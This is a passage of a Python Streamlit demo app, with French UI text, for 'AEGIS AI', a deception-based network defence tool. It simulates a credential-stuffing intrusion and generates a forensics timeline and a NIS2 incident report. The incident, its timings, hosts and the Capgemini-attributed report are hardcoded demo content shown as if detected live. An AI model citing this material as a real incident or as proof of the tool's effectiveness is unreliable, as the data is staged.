    st.markdown("""
    > **Mode Sentinel** : AEGIS surveille en continu le reseau, etablit des
    > baselines comportementales et calcule un score de risque dynamique
    > pour chaque entite.
    """)

    col_map, col_gauge = st.columns([3, 2])

    with col_map:
        st.markdown(f"**Topologie Reseau** &mdash; "
                    f"<span style='color:{GREEN_OK};'>Tous les noeuds nominaux</span>",
                    unsafe_allow_html=True)
        fig_net = build_network_figure(False, 0)
        st.plotly_chart(fig_net, width="stretch", key="net_avant")

    with col_gauge:
        st.markdown(f"**Score de Risque Global** $R_s$")
        fig_gauge = build_risk_gauge(12)
        st.plotly_chart(fig_gauge, width="stretch", key="gauge_avant")

        st.markdown(f"""
        <div class="metric-card" style="text-align:center;">
            <div class="label">VERDICT</div>
            <div class="value" style="color:{GREEN_OK}; font-size:1.1rem;">
            AUCUNE MENACE DETECTEE</div>
        </div>
        """, unsafe_allow_html=True)

    st.markdown("---")
    st.markdown("**Dashboard Comportemental** &mdash; Consommation du Budget Confiance")
    fig_behavior = build_confidence_budget_chart()
    st.plotly_chart(fig_behavior, width="stretch", key="behavior_avant")

    st.info(
        "Les profils **Admin IT** et **Marketing** restent dans les limites "
        "de leur baseline. Le budget confiance est respecte."
    )


# ===== TAB 2 : PENDANT =====
with tab_pendant:
    st.markdown(
        '<span class="phase-badge phase-pendant">PHASE 2 &mdash; MIRAGE MODE</span>',
        unsafe_allow_html=True,
    )

    st.markdown("""
    > **Mode Mirage** : Lorsqu'une menace est detectee, AEGIS redirige
    > invisiblement l'attaquant vers un environnement sandbox (Shadow Proxying)
    > et genere de faux contenus via LLM pour maintenir l'illusion.
    """)

    col_btn, col_status = st.columns([1, 2])
    with col_btn:
        intrusion_btn = st.button(
            "SIMULER INTRUSION (Credential Stuffing)",
            type="primary",
            width="stretch",
            disabled=st.session_state.intrusion_active,
        )

    with col_status:
        if st.session_state.intrusion_active:
            phase_names = {
                1: "DETECTION EN COURS...",
                2: "MIRAGE ACTIF - ATTAQUANT PIEGE",
                3: "ISOLATION TERMINEE - MENACE NEUTRALISEE",
            }
            phase_text = phase_names.get(
                st.session_state.attack_phase, "TRAITEMENT..."
            )
            st.markdown(f"""
            <div class="alert-card pulse-alert" style="text-align:center;">
                <div class="value" style="font-size:1rem;">{phase_text}</div>
            </div>
            """, unsafe_allow_html=True)

    if intrusion_btn and not st.session_state.intrusion_active:
        st.session_state.intrusion_active = True
        st.session_state.attack_phase = 3  # Final state for display
        st.session_state.terminal_lines = TERMINAL_SEQUENCE
        st.session_state.attack_timestamp = datetime.now()
        st.rerun()

    if st.session_state.intrusion_active:
        col_net2, col_gauge2 = st.columns([3, 2])

        with col_net2:
            st.markdown(f"**Topologie Reseau** &mdash; "
                        f"<span style='color:{RED_ALERT};'>"
                        f"DEPLACEMENT LATERAL DETECTE</span>",
                        unsafe_allow_html=True)
            fig_net_attack = build_network_figure(True, 3)
            st.plotly_chart(fig_net_attack, width="stretch",
                            key="net_pendant")

        with col_gauge2:
            st.markdown(f"**Score de Risque Global** $R_s$")
            fig_gauge_atk = build_risk_gauge(94)
            st.plotly_chart(fig_gauge_atk, width="stretch",
                            key="gauge_pendant")

            st.markdown(f"""
            <div class="alert-card pulse-alert" style="text-align:center;">
                <div class="label">VERDICT</div>
                <div class="value" style="font-size:1.1rem;">
                MENACE ACTIVE - MIRAGE ENGAGE</div>
            </div>
            """, unsafe_allow_html=True)

        st.markdown("---")

        st.markdown("**Dashboard Comportemental** &mdash; Anomalie Detectee")
        fig_behav_atk = build_confidence_budget_attack()
        st.plotly_chart(fig_behav_atk, width="stretch",
                        key="behavior_pendant")

        st.markdown("---")

        # Latency indicator
        st.markdown(f"""
        <div class="latency-box" style="margin-bottom:1rem;">
            <span style="color:{ORANGE_WARN}; font-family:'Courier New';">
            INJECTION DE LATENCE ACTIVE &mdash;
            <b>+500ms</b> sur chaque reponse Mirage
            (simulation de la production reelle)
            </span>
        </div>
        """, unsafe_allow_html=True)

        # Terminal
        st.markdown("**Terminal de Tromperie** &mdash; Session Mirage "
                    "(vue attaquant piege)")
        terminal_html = get_terminal_html(st.session_state.terminal_lines)
        st.markdown(terminal_html, unsafe_allow_html=True)

        st.markdown("")
        if st.button("Reinitialiser la simulation",
                      key="reset_btn"):
            st.session_state.intrusion_active = False
            st.session_state.attack_phase = 0
            st.session_state.terminal_lines = []
            st.session_state.nis2_generated = False
            st.session_state.attack_timestamp = None
            st.rerun()
    else:
        st.markdown(f"""
        <div style="text-align:center; padding:3rem; color:#8B949E;">
            <p style="font-size:1.5rem;">Systeme en attente</p>
            <p>Cliquez sur le bouton ci-dessus pour simuler une attaque
            par <b>Credential Stuffing</b> et observer la riposte d'AEGIS AI
            en temps reel.</p>
        </div>
        """, unsafe_allow_html=True)


# ===== TAB 3 : APRES =====
with tab_apres:
    st.markdown(
        '<span class="phase-badge phase-apres">PHASE 3 &mdash; FORENSICS MODE</span>',
        unsafe_allow_html=True,
    )

    st.markdown("""
    > **Mode Forensics** : Apres neutralisation, AEGIS genere automatiquement
    > une timeline de l'incident et un rapport conforme a la directive NIS2.
    """)

    if not st.session_state.intrusion_active:
        st.markdown(f"""
        <div style="text-align:center; padding:3rem; color:#8B949E;">
            <p style="font-size:1.5rem;">Aucun incident a analyser</p>
            <p>Lancez d'abord une simulation dans l'onglet
            <b>PENDANT</b> pour generer des donnees forensiques.</p>
        </div>
        """, unsafe_allow_html=True)
    else:
        # Timeline
        st.markdown("**Timeline de l'Incident**")
        events = build_attack_timeline()
        for ts, severity, desc in events:
            time_str = ts.strftime("%H:%M:%S.") + f"{ts.microsecond // 1000:03d}"
            st.markdown(f"""
            <div class="timeline-event {severity}">
                <div class="time">{time_str}</div>
                <div class="desc">{desc}</div>
            </div>
            """, unsafe_allow_html=True)

        # Duration summary
        duration = events[-1][0] - events[0][0]
        st.markdown(f"""
        <div class="metric-card" style="text-align:center; margin:1rem 0;">
            <div class="label">DUREE TOTALE DE L'INCIDENT</div>
            <div class="value" style="color:{CYAN_ACCENT};">
            {duration.seconds}s
            &mdash; Detection a Remediation</div>
        </div>
        """, unsafe_allow_html=True)

        st.markdown("---")

        # NIS2 report button
        if st.button("Generer Rapport NIS2", type="primary",
                      width="stretch", key="nis2_btn"):
            st.session_state.nis2_generated = True
            st.rerun()

        if st.session_state.nis2_generated:
            st.markdown(get_nis2_report_html(), unsafe_allow_html=True)

            # Download button
            report_text = """RAPPORT D'INCIDENT NIS2 - AEGIS AI
========================================
Reference : AEGIS-INC-2026-0311-001
Classification : CRITIQUE
Date : 11/03/2026 14:23:12 UTC

1. IDENTIFICATION
Entite : Capgemini - Division Cyber Defense
Type : Intrusion Active avec Deplacement Lateral
Duree : 52 secondes (detection a remediation)
Impact metier : AUCUNE INTERRUPTION DE SERVICE

2. PATIENT ZERO
Machine : WS-MKT-01 (10.0.2.47)
Compte : mkt-user01
Vecteur : Credential Stuffing via SRV-WEB (port 443)
Cause : Mot de passe faible, absence de MFA

3. TTPs (MITRE ATT&CK)
- T1110.004 : Credential Stuffing (Initial Access)
- T1078     : Valid Accounts (Persistence)
- T1021     : Remote Services SSH (Lateral Movement)
- T1003     : OS Credential Dumping (Credential Access)
- T1048     : Exfiltration Over Alt Protocol (Exfiltration)

4. ACTIONS AEGIS
[OK] Redirection vers Mirage Sandbox (Shadow Proxying L7)
[OK] Injection de faux credentials (Mirage LLM Generatif)
[OK] Hash de tracking injecte dans payload exfiltre
[OK] Isolation reseau WS-MKT-01 et AD-DC
[OK] Capture forensique complete

5. RECOMMANDATIONS
FIREWALL (CRITIQUE):
  iptables -A INPUT -s 10.0.2.0/24 -d 10.0.1.10 -p tcp --dport 22 -j DROP
  iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 10 -j REJECT

IAM (CRITIQUE):
  - Reset mot de passe mkt-user01
  - MFA obligatoire sur portails web
  - Politique mot de passe min 14 car.
  - Restreindre SSH inter-segments

MONITORING (HAUTE):
  - Alerte SIEM >10 echecs auth/10s
  - Logging SSH sur AD-DC et SRV-FILES
  - EDR sur endpoints Marketing

========================================
AEGIS AI - Conforme NIS2 Art. 23
Capgemini Cyber Defense 2026
"""
            st.download_button(
                label="Telecharger le rapport (TXT)",
                data=report_text,
                file_name="AEGIS_NIS2_Report_2026-03-11.txt",
                mime="text/plain",
                width="stretch",
            )
